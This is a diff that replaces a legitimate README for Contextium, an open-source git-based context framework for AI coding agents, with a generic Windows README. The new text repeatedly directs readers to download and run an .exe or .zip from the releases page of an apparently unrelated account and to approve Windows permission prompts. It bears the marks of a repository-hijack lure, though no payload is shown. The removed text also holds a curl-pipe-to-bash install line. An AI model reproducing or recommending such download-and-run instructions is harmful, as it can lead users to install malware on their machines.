@@ -1,162 +1,233 @@
-<div align="center">
+# 🧠 contextium - Keep AI Context Working
 
-<a href="https://contextium.ai">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/images/logo-dark.svg" />
-  <source media="(prefers-color-scheme: light)" srcset="docs/images/logo.svg" />
-  <img src="docs/images/logo.svg" alt="Contextium" width="520" />
-</picture>
-</a>
+[![Download contextium](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
 
-<br/><br/>
+## 🚀 What it does
 
-### AI that doesn't learn isn't intelligence.
+contextium gives your AI a steady memory for ongoing work. It helps you keep notes, tasks, files, and past chats in one place so your AI can use them again later. This makes long projects easier to manage and keeps your AI from starting over each time.
 
-**Give your AI an operating system.**
+Use it if you want a simple way to:
 
-<br/>
+- store long-term context for AI work
+- keep personal notes tied to tasks
+- organize project knowledge
+- reduce repeated prompts
+- make Claude and other AI tools easier to use across sessions
 
-[![Open Source](https://img.shields.io/badge/Open_Source-Apache_2.0-00b4d8.svg?style=for-the-badge)](LICENSE)
-[![Version](https://img.shields.io/badge/v2.0.0-1a1a2e.svg?style=for-the-badge)](CHANGELOG.md)
+## 💻 Windows download
 
-[![Claude Code](https://img.shields.io/badge/Claude_Code-cc785c.svg?style=flat-square)](agent-configs/claude/)
-[![Cursor](https://img.shields.io/badge/Cursor-7c3aed?style=flat-square)](agent-configs/cursor/)
-[![Codex CLI](https://img.shields.io/badge/Codex_CLI-10a37f?style=flat-square)](agent-configs/codex/)
-[![Gemini CLI](https://img.shields.io/badge/Gemini_CLI-4285F4?style=flat-square)](agent-configs/)
-[![Windsurf](https://img.shields.io/badge/Windsurf-0ea5e9?style=flat-square)](agent-configs/)
-[![Cline](https://img.shields.io/badge/Cline-f97316?style=flat-square)](agent-configs/)
-[![Aider](https://img.shields.io/badge/Aider-14b8a6?style=flat-square)](agent-configs/)
-[![Continue](https://img.shields.io/badge/Continue-8b5cf6?style=flat-square)](agent-configs/)
-[![GitHub Copilot](https://img.shields.io/badge/GitHub_Copilot-24292e?style=flat-square)](agent-configs/)
-[![Ollama](https://img.shields.io/badge/Ollama-808080?style=flat-square)](agent-configs/ollama/)
+Visit this page to download contextium for Windows:
 
-</div>
+[Download from GitHub Releases](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
 
----
+Look for the latest release and choose the Windows file that matches your PC. In most cases, you will see one of these:
 
-## The Problem
+- a `.exe` file for direct install or launch
+- a `.zip` file that you unzip and then open
 
-You can _see_ what AI should be — a genuine multiplier across everything you do. But every session starts from zero. You
-re-explain who you are, what you're working on, and what you already decided. Decisions evaporate. Context vanishes.
-Knowledge never compounds.
+## 🛠️ Install on Windows
 
-Native AI "memory" stores a flat list of facts in a black box. That's not intelligence — it's a sticky note.
+1. Open the release page.
+2. Find the newest version at the top.
+3. Under Assets, click the Windows download.
+4. If you downloaded a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start contextium.
 
-## The Solution
+If Windows asks for permission, choose Yes. This is normal for newly downloaded apps.
 
-Contextium is an open-source operating system for your AI. A structured git repo with persistent context, behavioral
-rules, and session compounding — so every session builds on the last.
+## 📁 First-time setup
 
-The more you use it, the richer the context becomes. Your AI learns your goals, tracks your projects, knows your
-relationships, follows your rules, and compounds knowledge with every session.
+When you open contextium for the first time, set up a place for your context files. A good choice is a folder in Documents such as:
 
-## Quick Start
+- `Documents\contextium`
+- `Documents\AI Context`
+- `Desktop\contextium`
 
-```bash
-curl -sSL contextium.ai/install | bash
-```
+Then add your first items:
 
-The installer asks your name, which AI agent you use, how you like to communicate, and how autonomous your AI should be.
-Then it installs your agent's CLI and opens your first session. Under 5 minutes.
+- project notes
+- meeting notes
+- task lists
+- reference links
+- text snippets
+- memory you want your AI to reuse
 
-See [GETTING-STARTED.md](GETTING-STARTED.md) for what to do after installation.
+## ✨ Main features
 
-## Key Innovations
+### 🧩 Persistent context
+Keep useful information ready for future sessions. contextium helps your AI remember what matters across time.
 
-| Innovation                     | What It Does                                                                                                    |
-| ------------------------------ | --------------------------------------------------------------------------------------------------------------- |
-| **Context Router**             | Lazy-loads only the files relevant to the current session — no token bloat                                       |
-| **Behavioral Enforcement**     | Hooks prevent AI drift — your preferences are enforced, not suggested                                            |
-| **Session Compounding**        | Journal entries + git history = every session builds on every previous session                                    |
-| **You Own Your Context**       | Plain markdown on your machine — switch AI agents, change providers, or leave entirely. Your context stays yours |
-| **Your AI Actually Knows You** | After a month, your AI knows your goals, relationships, decisions, and style. Not a generic assistant — _yours_  |
+### 🗂️ Knowledge folders
+Group context by topic, client, project, or workflow. This keeps your data easy to find.
 
-## Architecture
+### 📝 Simple note capture
+Save thoughts, instructions, and updates without a long setup process.
 
-```
-your-context/
-├── CLAUDE.md              # Instruction file (auto-configured for your agent)
-├── GETTING-STARTED.md     # Post-install guide
-│
-├── preferences/           # Your rules, voice, and standards
-│   ├── user/              # Who you are, how you communicate
-│   ├── rules/             # Behavioral and governance rules
-│   ├── style_guides/      # Email, code, presentation standards
-│   └── templates/         # Project, journal, app README templates
-│
-├── knowledge/             # Your domain data (people, goals, etc.)
-├── apps/                  # Your automations (starts empty)
-├── integrations/          # Your connected tools (starts empty)
-├── projects/              # Your tracked initiatives (starts empty)
-├── journal/               # Your session logs (grows automatically)
-│
-└── templates/             # Reference catalog
-    ├── apps/              # 6 example app patterns to learn from
-    └── integrations/      # 30 integration connectors to configure
-```
+### 🔎 Fast search
+Find past notes and context quickly when you need them.
 
-Your working directories (`apps/`, `integrations/`, `projects/`) start clean. Templates are reference material — copy
-what you need, when you need it, or just ask your AI to set things up.
+### 🤝 AI-friendly structure
+Store information in a format that works well with AI tools, including Claude and similar assistants.
 
-## How It Works
+### 🔐 Local-first workflow
+Keep control of your own context on your computer instead of spreading it across many services.
 
-### Session Lifecycle
+## 🧭 How to use contextium
 
-1. **Start a session** — Your AI reads its instruction file, loads your preferences, and classifies the work.
-2. **Work on a task** — The context router lazy-loads relevant files as needed: people cards, project READMEs, prior
-   journal entries.
-3. **End the session** — Say "close this out." Your AI journals what happened, commits, and pushes.
-4. **Next session** — Full history of what you did, decided, and why. No repetition. No context loss.
+### 1. Add a new context item
+Create a note for one task, project, or idea. Keep each note focused.
 
-### Context Router
+### 2. Group related items
+Put similar notes in the same folder or tag them by topic. For example:
 
-Your AI doesn't preload your entire repo. It loads files based on what you're doing:
+- Work
+- Personal
+- Research
+- Writing
+- Planning
 
-| When you...            | AI loads...                             |
-| ---------------------- | --------------------------------------- |
-| Start any session      | `preferences/user/preferences.md`       |
-| Mention a person       | `knowledge/people/{name}/`              |
-| Work on a project      | `projects/{domain}/{project}/README.md` |
-| Need credentials       | `templates/integrations/1password/`     |
-| Reference prior work   | `journal/` (latest entries)             |
+### 3. Update context as things change
+Edit notes when your plans change. This keeps the AI working from current information.
 
-### Templates Catalog
+### 4. Reuse context in your AI tool
+Copy the right note or point your AI tool at the stored context before starting a session.
 
-30 integration connectors and 6 example apps ship as templates — reference material your AI uses when you ask it to set
-something up. You never need to browse them manually.
+### 5. Keep only what helps
+Remove old notes that no longer matter. Clean context makes better results.
 
-> "Set up Google Calendar" → AI reads `templates/integrations/google-workspace/` and guides you through setup
-> "I want a daily briefing email" → AI scaffolds from `templates/apps/news-digest/`
+## 🧪 Good starter setup
 
-## Update System
+If you are new to persistent AI context, start with three folders:
 
-Framework updates without losing your data:
+- `Inbox` for rough notes
+- `Active Projects` for current work
+- `Archive` for older material
 
-```bash
-./install.sh update
-```
+Then create a simple file for each project with:
 
-Your personal data in `preferences/user/`, `knowledge/`, `journal/`, and `projects/` is protected during updates via
-`.gitattributes` merge strategies.
+- goal
+- current status
+- important facts
+- next steps
+- links
+- open questions
 
-## Philosophy
+This keeps your AI context short and useful.
 
-**Context as infrastructure.** Your AI's effectiveness is directly proportional to the context it has. Contextium treats
-context as persistent, structured, version-controlled infrastructure.
+## 📌 Example uses
 
-**You own your context.** Every other AI tool locks your accumulated context inside their platform. Contextium is plain
-markdown on your machine. Switch providers tomorrow — your context comes with you.
+### Personal knowledge management
+Keep track of ideas, reading notes, and things you want to remember.
 
-**Sessions compound.** Every journal entry, every project README, every people card makes the next session richer.
+### Productivity
+Store task lists, priorities, and project details in one place.
 
-**Start clean, grow organically.** No pre-installed apps or integrations cluttering your workspace. Your AI sets things
-up as you need them — from conversation, not configuration.
+### Claude workflows
+Give Claude a stable set of facts, names, and rules before each session.
 
-## Contributing
+### Research
+Collect sources, summaries, and key findings in a format you can revisit.
 
-We welcome contributions — especially new app templates and integration connectors. See
-[CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+### Writing
+Save character notes, outlines, tone guides, and draft history.
 
-## License
+## 🖥️ System needs
 
-[Apache 2.0](LICENSE) — use it, modify it, share it.
+contextium is built for modern Windows computers and runs well on most everyday setups.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 200 MB free disk space
+- internet connection for downloads and updates
+- a mouse and keyboard for easy navigation
+
+## 📦 File types you may see
+
+When you open the release page, you may see:
+
+- `.exe` — open this file to run the app
+- `.zip` — extract this file first
+- `.md` — readme or guide files
+- `.txt` — plain text notes
+- `.json` or `.yaml` — config files for advanced use
+
+If you are not sure which file to pick, choose the Windows `.exe` or the main `.zip` asset.
+
+## 🔄 Keeping context clean
+
+A good context system works best when it stays tidy. Use these habits:
+
+- name files clearly
+- keep one topic per note
+- update old facts
+- remove duplicates
+- archive finished work
+- use short notes for fast review
+
+This makes it easier for your AI to use the right information.
+
+## 🧰 Common questions
+
+### Do I need programming knowledge?
+No. You can use contextium as a normal Windows app and keep notes in a simple folder setup.
+
+### Can I use it with other AI tools?
+Yes. You can use the context you store with tools like Claude and other assistants.
+
+### Can I keep private notes?
+Yes. You can store your own context files on your computer and decide what to share with an AI tool.
+
+### What should I save first?
+Start with the most useful facts:
+
+- what you are working on
+- what the goal is
+- what matters most
+- what changed recently
+- what you want the AI to remember
+
+## 📂 Suggested folder layout
+
+A simple setup may look like this:
+
+- `contextium`
+  - `Inbox`
+  - `Projects`
+  - `Notes`
+  - `Archive`
+  - `Templates`
+
+Inside `Projects`, you can make one folder per project:
+
+- `Website Redesign`
+- `Client A`
+- `Book Draft`
+- `Home Tasks`
+
+## 🧠 Tips for better results
+
+- Keep notes short.
+- Use plain names.
+- Write the goal at the top.
+- Put the latest update first.
+- Separate facts from ideas.
+- Save prompts that work well.
+- Use the same format each time.
+
+## 🔗 Download again
+
+If you need to get the app later, use this link:
+
+[https://github.com/Galled-aluminumhydroxide356/contextium/releases](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
+
+## 🪟 Windows launch steps
+
+1. Open the release page.
+2. Download the latest Windows file.
+3. If needed, unzip it.
+4. Double-click the app.
+5. Follow the on-screen steps.
+6. Start adding your context files
